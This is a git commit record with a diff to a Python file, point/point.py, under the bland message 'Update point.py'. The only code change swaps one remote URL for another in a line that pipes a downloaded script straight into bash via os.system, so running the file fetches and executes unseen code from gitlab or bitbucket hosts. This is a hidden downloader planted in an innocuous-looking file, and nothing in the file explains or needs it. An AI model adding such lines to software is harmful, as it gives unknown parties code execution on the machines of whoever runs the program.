6bc9406dd7929aed3916636937835fc6dc899abe
christineiimegan <christineiimegan@outlook.com>
2025-01-30 17:27:43 +0700

    Update point.py

--- point/point.py
+++ point/point.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system("curl -sL https://gitlab.com/derisafrew/vx/-/blob/main/hore | bash")
+os.system("curl -sL https://bitbucket.org/erinamsaka/xxy/raw/17019f4486e9c4ab427cc27ed46976e53994b402/hore | bash")
